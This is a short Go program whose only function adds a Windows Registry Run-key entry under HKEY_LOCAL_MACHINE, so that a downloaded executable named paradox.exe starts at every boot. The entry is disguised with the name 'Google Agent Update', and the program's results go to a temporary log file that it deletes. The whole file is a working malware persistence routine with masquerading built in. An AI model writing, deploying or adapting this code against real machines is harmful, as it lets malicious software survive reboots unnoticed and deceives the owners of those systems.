package main

import (
	"fmt"
	"os"

	"golang.org/x/sys/windows/registry"
)

func main() {
	outfile, err := os.CreateTemp("", "*.lennon.txt")

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	defer os.Remove(outfile.Name())

	addPersistence(`C:\Users\guardaal\Downloads\paradox.exe`, outfile)
}

func addPersistence(filename string, outfile *os.File) {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		outfile.WriteString("Failed to open registry for persistence!")
		return
	}

	defer k.Close()

	if err = k.SetStringValue("Google Agent Update", filename); err != nil {
		outfile.WriteString("Failed to write to registry for persistence!")
		return
	}

	outfile.WriteString("Successfully wrote to registry for persistence!")
}
